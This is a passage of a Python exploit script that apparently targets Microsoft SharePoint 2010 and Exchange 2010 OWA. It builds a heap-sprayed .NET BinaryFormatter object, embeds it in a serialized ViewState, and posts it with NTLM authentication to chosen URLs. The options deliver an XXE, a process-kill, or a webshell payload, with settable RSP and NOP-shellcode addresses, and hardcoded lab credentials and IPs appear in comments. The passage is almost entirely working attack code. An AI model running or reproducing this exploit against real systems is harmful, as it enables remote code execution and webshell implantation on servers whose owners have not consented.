    obj["2"][1]["Length"] = len(heap)
    obj["2"][1]["Values"] = heap
    obj["3"][1]["Length"] = len(heaprop)
    obj["3"][1]["Values"] = heaprop
    obj["4"][1]["Length"] = len(heapsc)
    obj["4"][1]["Values"] = heapsc
    objid = 5 # sample obj
    # spray 400 heap
    for i in range(400):
        objid = objid + 1
        obj[str(objid)] = json.loads(json.dumps(obj["5"]))
        obj[str(objid)][1]["ClassInfo"]["ObjectId"] = objid
        obj[str(objid)][1]["Values"][0][1][1]["IdRef"] = 2
    # spray 400 heaprop
    for i in range(400):
        objid = objid + 1
        obj[str(objid)] = json.loads(json.dumps(obj["5"]))
        obj[str(objid)][1]["ClassInfo"]["ObjectId"] = objid
        obj[str(objid)][1]["Values"][0][1][1]["IdRef"] = 3
    # spray 400 heapsc
    for i in range(400):
        objid = objid + 1
        obj[str(objid)] = json.loads(json.dumps(obj["5"]))
        obj[str(objid)][1]["ClassInfo"]["ObjectId"] = objid
        obj[str(objid)][1]["Values"][0][1][1]["IdRef"] = 4
    # MessageEnd
    #objid = objid + 1
    #print objid
    #obj[str(objid)]= json.loads(json.dumps('[ "MessageEnd", null ]'))

    #f = open('examples\\KillProcess_full.json','w')
    #f.write(json.dumps(obj))
    #f.close()
    return obj

def create_xxe_payload():
    xxe_file = 'examples\\DataSet_XXE.json'
    obj = json.loads(open(xxe_file).read())
    return obj


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print """Usage: %s <target> <type> <target_server> <target_software> [<custom_rsp_addr> <custom_nopshellcode_addr>]
type:
  xxe
  kill_process
  webshell
target_server:
  windows_server_2008_r2_sp1,
  windows_server_2008_r2_nosp
target_software:
  sharepoint_2010_nosp,
  exchange_server_2010_nosp,
  exchange_server_2010_sp3,
  sharepoint_office_server_2007_r2_port80,
  sharepoint_office_server_2007_r2_port8080
'''

""" % sys.argv[0]
        sys.exit(0)

    #f=open(sys.argv[1])
    #myObject = json.loads(f.read())
    #print 'myObject: ', repr(myObject)
    #f.close()
    url = sys.argv[1]
    myObject = ''
    type_exploit = sys.argv[2]
    if type_exploit == "xxe":
        myObject = create_xxe_payload()
    elif type_exploit == "kill_process":
        target_server = sys.argv[3]
        target_software = sys.argv[4]
        custom_rsp_addr = ""
        custom_nopshellcode_addr = ""
        if len(sys.argv) > 5:
            custom_rsp_addr= sys.argv[5]
            custom_nopshellcode_addr= sys.argv[6]
        myObject = create_payload(True,target_server, target_software,custom_rsp_addr, custom_nopshellcode_addr)
    elif type_exploit == "webshell":
        target_server = sys.argv[3]
        target_software = sys.argv[4]
        custom_rsp_addr = ""
        custom_nopshellcode_addr = ""
        if len(sys.argv) > 5:
            custom_rsp_addr= sys.argv[5]
            custom_nopshellcode_addr= sys.argv[6]
        myObject = create_payload(False,target_server, target_software,custom_rsp_addr, custom_nopshellcode_addr)
    else:
        raise Exception('type_exploit error')
        

    dotnet_binary = ''

    for o in range(len(myObject)):
        RecordType = JSON2dotnetBinaryFormatter.RecordTypeEnum[myObject[str(o)][0]]
        #print myObject[str(o)][0]
        dotnet_binary += struct.pack('<B', RecordType[0])
        dotnet_binary += RecordType[1](myObject[str(o)][1])
    
    dotnet_binary_base64 = b64encode(dotnet_binary)
    #print "dotnet_binary_base64: " , dotnet_binary_base64

    myObject = ViewStateExample.sample
    myObject["Token_Pair"][0]["Token_Pair"][1]["Token_Pair"][1]["Token_ArrayList"][1]["Token_Pair"][1]["Token_ArrayList"][1]["Token_Pair"][0]["Token_Pair"][0]["Token_ArrayList"][2]["Token_BinarySerialized"]=dotnet_binary_base64
    TypeList = []


    viewstate_binary = chr(JSON2ViewState.Marker_Format) + chr(JSON2ViewState.Marker_Version_1)
    viewstate_binary += JSON2ViewState.SerializeValue(myObject)

    viewstate_binary_base64 = b64encode(viewstate_binary)
    #print 'viewstate_binary_base64: ', viewstate_binary_base64

    f = open(sys.argv[2]+'_binary', 'w')
    f.write(viewstate_binary_base64)
    f.close()

    print "[+] start send request"
    user = 'Administrator'
    password = "123456a@"
    #url = "http://192.168.181.140/_layouts/viewlsts.aspx"
    #url = "http://192.168.181.146/_layouts/viewlsts.aspx"
    #url = "https://192.168.181.139/owa/auth/logon.aspx"
    #url = "https://192.168.181.156/owa/auth/logon.aspx"
    #url = "https://192.168.181.144/owa/auth/logon.aspx"
    #url = "https://192.168.181.145/owa/auth/logon.aspx"
    #url = "http://192.168.181.152/_layouts/viewlsts.aspx"
    passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
    passman.add_password(None, url, user, password)
    # create the NTLM authentication handler
    auth_NTLM = HTTPNtlmAuthHandler.HTTPNtlmAuthHandler(passman)
    print 'create auth ntlm'

    # create and install the opener
    opener = urllib2.build_opener(auth_NTLM)
    urllib2.install_opener(opener)
    data = {"BaseType": "0", "__VIEWSTATE": viewstate_binary_base64}
    #data = {}
    try:
        request = urllib2.Request(url, data=urlencode(data))
        result = urllib2.urlopen(request)
        resp = result.read()
        print 'resp: ', resp
    except urllib2.HTTPError as e:
        print 'http status: ', e.code




